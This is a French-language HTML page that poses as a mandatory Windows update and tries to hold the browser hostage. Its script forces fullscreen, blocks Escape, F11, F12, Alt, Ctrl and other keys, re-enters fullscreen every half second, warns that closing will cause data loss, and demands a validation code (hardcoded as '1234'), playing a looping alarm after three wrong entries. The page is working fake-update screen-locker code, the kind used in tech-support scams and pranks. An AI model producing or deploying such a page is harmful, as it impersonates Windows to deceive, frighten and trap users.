<!DOCTYPE html><html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 Mise à jour Windows</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        html, body {
            width: 100%;
            height: 100%;
            background: #0078D7;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
            cursor: none;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 5%;
            border-radius: 10px;
            box-shadow: 0 0 10px white;
            width: 60vw;
            height: 50vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4vw;
            margin-bottom: 2vh;
        }
        #alert-message {
            font-size: 2vw;
            margin-bottom: 3vh;
        }
        input {
            padding: 1vh;
            font-size: 2vw;
            margin-bottom: 2vh;
            text-align: center;
            outline: none;
            width: 50%;
        }
        button {
            background: black;
            color: white;
            padding: 2vh 4vw;
            font-size: 2vw;
            cursor: pointer;
        }
        #error-message {
            color: yellow;
            font-size: 1.5vw;
            margin-top: 2vh;
        }
    </style>
</head>
<body onload="startLockdown()">
    <div class="container">
        <h1>🔒 Mise à jour Windows en cours</h1>
        <p id="alert-message">
            🚨 Votre système est actuellement en mise à jour obligatoire 🚨<br>
            Ne redémarrez pas votre ordinateur sous peine de perte de données.<br>
            Pour continuer, veuillez entrer le code de validation.
        </p>
        <input type="password" id="codeInput" placeholder="Entrez le code de validation..." autofocus>
        <button onclick="checkCode()">Valider</button>
        <p id="error-message"></p>
    </div>
    <script>
        const SECRET_CODE = "1234";
        let attempts = 0;
        const maxAttempts = 3;function startLockdown() {
        requestFullScreen();
        blockKeys();
        preventClose();
        document.getElementById("codeInput").focus();
    }

    function checkCode() {
        let inputCode = document.getElementById("codeInput").value;
        if (inputCode === SECRET_CODE) {
            unlockSystem();
        } else {
            attempts++;
            document.getElementById("error-message").textContent = `⛔ Code incorrect (${attempts}/${maxAttempts})`;
            if (attempts >= maxAttempts) {
                playAlarm();
            }
        }
    }

    function requestFullScreen() {
        let elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }

    function blockKeys() {
        document.addEventListener("keydown", function (event) {
            let blockedKeys = ["Escape", "F11", "F12", "Tab", "Control", "Alt", "Meta", "Shift", "Delete"];
            if (blockedKeys.includes(event.key)) {
                event.preventDefault();
            }
        });
    }

    function playAlarm() {
        let audio = new Audio("https://www.soundjay.com/button/beep-07.wav");
        audio.loop = true;
        audio.play();
    }

    function unlockSystem() {
        document.exitFullscreen();
        document.body.innerHTML = "<h1 style='color: green;'>✅ Mise à jour terminée</h1>";
        setTimeout(() => {
            window.location.href = "about:blank";
        }, 3000);
    }

    function preventClose() {
        window.onbeforeunload = function() {
            return "🚨 Attention ! Cette action peut provoquer une perte de données.";
        };
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                setTimeout(requestFullScreen, 10);
            }
        });
        setInterval(() => {
            if (!document.fullscreenElement) {
                requestFullScreen();
            }
        }, 500);
    }
</script>

</body>
</html>
